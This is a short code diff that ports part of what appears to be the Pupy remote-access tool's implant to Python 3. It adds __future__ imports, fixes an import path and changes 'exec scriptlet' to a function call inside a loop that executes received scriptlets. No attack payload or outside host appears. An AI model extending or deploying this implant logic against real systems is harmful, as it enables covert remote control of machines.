@@ -30,6 +30,10 @@
 # POSSIBILITY OF SUCH DAMAGE
 # ---------------------------------------------------------------
 
+from __future__ import absolute_import
+from __future__ import division
+from __future__ import print_function
+from __future__ import unicode_literals
 import sys
 
 import threading
@@ -46,7 +50,7 @@ from network.lib.streams.PupySocketStream import PupyChannel
 from network.lib.buffer import Buffer
 from network.lib.msgtypes import MSG_TYPES_PACK
 from network.lib.rpc.core.service import Service, ModuleNamespace
-from network.lib.rpc.lib.compat import execute
+from network.lib.compat import execute
 
 import umsgpack
 
@@ -552,7 +556,7 @@ def run(config):
 
         for scriptlet in scriptlets:
             try:
-                exec scriptlet
+                exec(scriptlet)
             except Exception as e:
                 logger.exception(e)
 
